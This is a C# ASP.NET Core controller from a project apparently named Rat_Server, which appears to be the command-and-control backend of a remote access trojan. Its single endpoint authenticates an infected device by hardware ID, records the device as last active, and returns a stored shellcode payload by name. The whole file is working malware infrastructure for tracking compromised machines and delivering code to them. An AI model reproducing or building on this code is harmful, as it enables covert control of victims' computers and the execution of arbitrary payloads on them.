﻿using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model.Context;
using Rat_Server.Model.Entities;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.DataConverter;

namespace Rat_Server.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ShellCodeController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;
     
        public ShellCodeController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }

        [HttpGet("GetShellCode/{Name}")]
        public async Task<ActionResult> GetShellCode([FromHeader] Guid Hwid, string Name)
        {
            Device? device = await _context.Devices.SingleOrDefaultAsync(d => d.Hwid == Hwid);
            if (device == null)
            {
                return Unauthorized();
            }
            else
            {
                device.LastActive = DateTime.Now;
                await _context.SaveChangesAsync();
            }

            ShellCode? shellCode = await _context.ShellCodes.SingleOrDefaultAsync(shellCode => shellCode.Name == Name);
            if (shellCode == null)
            {
                return NotFound();
            }

            return Ok(new ShellCodeDto
            {
                Name = shellCode.Name,
                Code = shellCode.Code
            });
        }
    }
}
